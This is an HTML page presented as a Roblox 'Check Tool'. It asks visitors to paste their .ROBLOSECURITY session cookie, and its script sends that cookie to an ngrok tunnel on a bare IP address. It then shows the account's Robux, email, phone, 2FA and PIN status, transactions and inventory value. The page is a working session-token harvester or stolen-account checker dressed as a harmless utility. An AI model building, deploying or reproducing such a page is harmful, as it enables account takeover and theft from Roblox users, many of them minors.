<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Check Tool - Dark Mystery</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    /* full‚Äëpage scroll */
    * { margin:0; padding:0; box-sizing:border-box; }
    html, body {
      height:100%; width:100%; overflow:auto;
      font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color:#f0f0f0;
    }

    /* Background video & overlay */
    #bgVideo {
      position:fixed; top:50%; left:50%;
      width:100%; height:100%; object-fit:cover;
      transform:translate(-50%,-50%); z-index:-2;
    }
    #overlay {
      position:fixed; top:0; left:0;
      width:100%; height:100%; background:rgba(0,0,0,0.7);
      z-index:-1;
    }

    /* UI container */
    .container {
      position: relative;
      margin: 80px auto;
      width: 80%; max-width: 800px;
      padding: 30px;
      text-align: center;
      background: rgba(255,255,255,0.05);
      border-radius: 12px;
      box-shadow: 0 4px 30px rgba(0,0,0,0.5);
      z-index: 1;
    }
    .container h1 {
      font-size:3rem; margin-bottom:20px;
      text-shadow:0 0 10px rgba(255,255,255,0.2);
    }
    #tokenInput {
      width:100%; padding:12px 15px; font-size:1rem;
      border:1px solid rgba(255,255,255,0.3);
      border-radius:6px; background:rgba(255,255,255,0.1);
      color:#f0f0f0; outline:none; margin-bottom:20px;
    }
    #tokenInput::placeholder { color:rgba(240,240,240,0.6); }

    .action-row {
      display:inline-flex; align-items:center; gap:15px;
    }
    .action-btn {
      padding:15px 30px; font-size:1rem; border:none;
      border-radius:8px; background:rgba(255,0,0,0.8);
      color:#fff; cursor:pointer;
      transition:background .3s, transform .2s;
    }
    .action-btn:hover {
      background:rgba(255,0,0,1); transform:translateY(-2px);
    }
    .back-link {
      font-size:.9rem; color:rgba(240,240,240,0.8);
      text-decoration:none; transition:color .2s;
    }
    .back-link:hover { color:#fff; }

    #message {
      margin-top:10px; min-height:1.2em;
      font-size:.9rem; color:#ff5c5c;
    }

    /* Results panel outside of UI container */
    #results {
      display:none;
      width:80%; max-width:800px;
      margin:40px auto; /* space from UI */
      background:rgba(47,49,54,0.8);
      border:1px solid #7289da;
      padding:20px; border-radius:10px;
      box-shadow:0 2px 8px rgba(0,0,0,0.5);
      position:relative; z-index:1;
    }
    #avatarThumb {
      position:absolute; top:10px; right:10px;
      width:48px; height:48px; border-radius:50%;
      border:2px solid #7289da; background:#2f3136;
    }
    .section { margin-bottom:20px; }
    .section h2 {
      font-size:1.4rem; margin-bottom:10px;
      color:#fff; border-bottom:1px solid #7289da;
      padding-bottom:5px;
    }
    .field-row {
      display:grid;
      grid-template-columns:repeat(auto-fill, minmax(150px,1fr));
      gap:12px;
    }
    .field {
      background:rgba(79,84,92,0.3);
      padding:8px; border-radius:6px;
    }
    .field .key { font-weight:600; color:#99aab5; }
    .field .value {
      margin-top:4px; color:#dcddde;
      word-break:break-word;
    }
  </style>
</head>
<body>

  <!-- Fullscreen Background Video -->
  <video id="bgVideo" autoplay muted loop playsinline>
    <source src="https://raw.githubusercontent.com/crystalizer700/Ro-Checker/main/moonside-lake-bloodborne-moewalls-com%20-%20LOOP%20-%20Videobolt.net.mp4
" type="video/mp4">
    Your browser does not support the video tag.
  </video>
  <div id="overlay"></div>

  <!-- Invisible YouTube iframe for audio only -->
  <iframe src="https://www.youtube.com/embed/lfF58yMbqRs?autoplay=1&loop=1&playlist=lfF58yMbqRs&controls=0&disablekb=1&modestbranding=1"
    style="position:absolute;width:0;height:0;border:0;top:-9999px;left:-9999px;" allow="autoplay; encrypted-media">
  </iframe>

  <div class="container">
    <h1>Check Tool</h1>
    <input id="tokenInput" type="text" placeholder="Paste your .ROBLOSECURITY token here...">
    <div class="action-row">
      <button id="executeBtn" class="action-btn" onclick="runCheck()">Run Check</button>
      <a href="index.html" class="back-link">‚Üê Back to Dashboard</a>
    </div>
    <div id="message"></div>
  </div>

  <div id="results">
    <img id="avatarThumb" src="" alt="Avatar">
    <div class="section">
      <h2>Account Info</h2>
      <div class="field-row" id="accountFields"></div>
    </div>
    <div class="section">
      <h2>Security Info</h2>
      <div class="field-row" id="securityFields"></div>
    </div>
    <div class="section">
      <h2>Transactions</h2>
      <div class="field-row" id="transactionFields"></div>
    </div>
    <div class="section">
      <h2>Additional Info</h2>
      <div class="field-row" id="extraFields"></div>
    </div>
  </div>

  <script>
    const labels = {
      UserID:'üÜî Account ID', Username:'üë§ Username', Robux:'üí∞ Robux', RAP:'üìà RAP',
      AccountAge:'üìÜ Account Age', Above13:'üîû Above 13', Gender:'‚ößÔ∏è Gender', Birthdate:'üéÇ Birthdate',
      EmailVerified:'‚úâÔ∏è Email Verified', PINEnabled:'üîê PIN Enabled', TwoStep2FA:'üõ°Ô∏è 2FA Enabled',
      SalesTotal:'üíµ Sales Total', PurchasesTotal:'üõí Purchases',
      PendingRobuxTotal:'üí≥ Pending Robux', OutgoingRobuxTotal:'üí∏ Outgoing Robux',
      Email:'‚úâÔ∏è Email', Phone:'üìû Phone', FriendsCount:'ü§ù Friends',
      Followers:'üë• Followers', Country:'üåç Country', TotalInvValue:'üóÉÔ∏è Inventory Value'
    };

    let lastClick = 0;
    async function runCheck(){
      const now = Date.now();
      const msg = document.getElementById('message');
      const box = document.getElementById('results');
      msg.style.display = box.style.display = 'none';

      if(now - lastClick < 5000){
        const secs = Math.ceil((5000 - (now - lastClick))/1000);
        msg.textContent = `Try again in ${secs}s`;
        msg.style.display = 'block';
        return;
      }
      lastClick = now;
      msg.textContent = '';

      const cookie = document.getElementById('tokenInput').value.trim();
      if(cookie.length < 1300 || cookie.length > 1900){
        msg.textContent = 'Invalid Token or Unauthorized Access';
        msg.style.display = 'block';
        return;
      }

      try {
        const res = await fetch('https://7afe-157-90-211-250.ngrok-free.app/check', {
          method: 'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({cookie})
        });
        if(!res.ok){
          const e = await res.json(); throw new Error(e.detail || 'Unknown error');
        }
        const data = await res.json();
        displayResults(data);
      } catch(e) {
        msg.textContent = e.message;
        msg.style.display = 'block';
      }
    }

    function createField(key, val){
      const displayVal = (val == null) ? 'None' : val;
      const div = document.createElement('div');
      div.className = 'field';
      div.innerHTML = `<div class="key">${labels[key]}</div><div class="value">${displayVal}</div>`;
      return div;
    }

    function displayResults(data){
      const d = data.profile;
      const sections = {
        account: {
          Username: d.Username,
          UserID: d.UserID,
          Robux: d.Robux,
          RAP: d.RAP,
          AccountAge: `${(d.AccountAgeInDays/365).toFixed(2)} years`,
          Above13: d.Above13 ? "Yes" : "No",
          Gender: d.Gender || "None",
          Birthdate: d.Birthdate || "Unknown"
        },
        security: {
          EmailVerified: d.EmailVerified ? "Yes" : "No",
          PINEnabled: d.PINEnabled ? "Yes" : "No",
          TwoStep2FA: d.TwoStep2FA ? "Yes" : "No",
          Email: d.Email || "None",
          Phone: d.Phone || "None"
        },
        transaction: {
          SalesTotal: d.sales_total ?? "None",
          PurchasesTotal: d.purchases_total ?? "None",
          PendingRobuxTotal: d.pending_robux_total ?? "None",
          OutgoingRobuxTotal: d.outgoing_robux_total ?? "None"
        },
        extra: {
          FriendsCount: d.FriendsCount,
          Followers: d.FollowersCount,
          Country: d.Country || "None",
          TotalInvValue: d.TotalInvValue + ' R$'
        }
      };

      ['accountFields','securityFields','transactionFields','extraFields']
        .forEach(id => document.getElementById(id).innerHTML = '');

      Object.entries(sections).forEach(([sec, fields]) => {
        const container = document.getElementById(sec + 'Fields');
        Object.entries(fields).forEach(([k, v]) =>
          container.appendChild(createField(k, v))
        );
      });

      document.getElementById('avatarThumb').src = d.AvatarThumb || '';
      document.getElementById('results').style.display = 'block';
    }
  </script>

</body>
</html>
